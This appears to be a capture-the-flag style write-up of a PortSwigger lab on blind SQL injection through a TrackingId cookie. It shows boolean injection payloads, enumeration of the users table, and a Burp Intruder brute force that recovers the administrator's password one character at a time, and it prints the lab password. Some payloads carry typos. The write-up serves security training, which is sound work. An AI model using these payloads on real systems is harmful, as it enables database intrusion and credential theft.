## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/a2277a84-8741-4b90-b15e-d88ad9c9eda9)


## Solution :

Query made - 

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'
```
![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/6f499d35-6e1f-418e-8a34-f8b18889ea14)

*This how the session looks like where ```TrackingId and COOKIE-VALUE``` are shown and  Welcome back message is also displyed.*


TrackingID parameter is vulnerable. So it is vulnerablecan to blind SQL injection on trackingID parameter.

```If the Condition is true it will display the Welcome back message```

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=1-- '
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/fe425f15-d397-46a0-a068-7bcbdc6b4de8)

```If the Condition is not true it will not  display the Welcome back message```

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=2-- '
```
![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/8490db5d-55ae-4aaa-8924-0aee2f53704e)

#### Check Whether the users table is present  -

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'Ananthan' FROM users LIMIT 1) = 'Ananthan' --
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/1c3a0a67-73de-444c-b0bb-ad5af810eb62)

It display the Welcome back message. So ```user``` table is present.


#### Check Whether the username administrator is present in users table -

```Here table name is users```

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'Ananthan' FROM users WHERE username='administrator')='Ananthan
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/88dbcb08-b121-47a8-8b20-cad203b083d4)

It display the Welcome back message. So username ```administrator```  is present in the user table.

#### Check the length password of administrator-

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'Ananthan' FROM users WHERE username='administrator' AND LENGTH(password)>15))='Ananthan
```
 
![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/6db47b3e-85b7-413e-aaf1-8ce6dc413045)

```Here 15 indicates the length of the password and it returns the response as true means the length of the password is greater than 15 as it display the Welcome back message.```

```Then changed the length from 15 to 25 ```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/a2bd8908-a70e-425e-87bd-efde7e4d2bbe)

 ```It returns the response as false means the length of the password is less than 25 as it didn't display the Welcome back message.So the password length must be in between 15-25.```

```To find the length of the password send qury to  Intruder then and Add the password length part [> 15] and select attack type as SNIPER```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/0cb97d88-5d96-4803-a9d6-8a7c6f3c2345)

```Then go to  payload sleect payload type as numbers after that set from 15 to 25.```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d3b3e562-81b9-449c-97e6-d3d64aa52be2)

```Then go to Grep-Match in setting and type Welcome back and start attack.```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/e55351a5-0c64-4f7a-8270-008268938e20)
 
```After brute-force we understood that 20 is length of the password because while checking if length(password) > 20 it FAILS it didn't display the Welcome back message.```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/1eb1d632-3ab2-4d73-b790-7c106fe6aadd)

#### Fining the  20 character length password by Brute force -


```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator' )='Ananthan--
```
we will able get the first character of the password that is  ```u```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/ca75666a-da6e-4522-a2bc-d8ab76615131)

```To get all character of the password togther we need to set the attack type as cluter bomb and set to payloads one is for the postion of the chractor and other one normal string payload and select 1st payload set as number[range 1-20] to detemine the postion of the character and other payload as bruteforce [min & max length = 1] to determine the character . And then go to Grep-Match in setting and type Welcome back and start attack.```

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator' )='$Ananthan$'--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/3c5afa8f-6b01-4cf9-95b5-b734ab02728b)

Now, we have received 20 different payloads that provide us with the 'Welcome back' option

![Screenshot 2024-02-04 153346](https://github.com/ananthan05/Portswigger_labs/assets/140697378/bae24401-2cb9-48dd-8acc-5ffa58ba0e55)

Araange the payload2 characters according to the payload1 numbers in the correct order .

Password  = `uc5e5ot47gtajjumawrg`

Successfully logged in administrator.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/eb508fb6-0848-4c78-aeb2-a64df691d8e6)


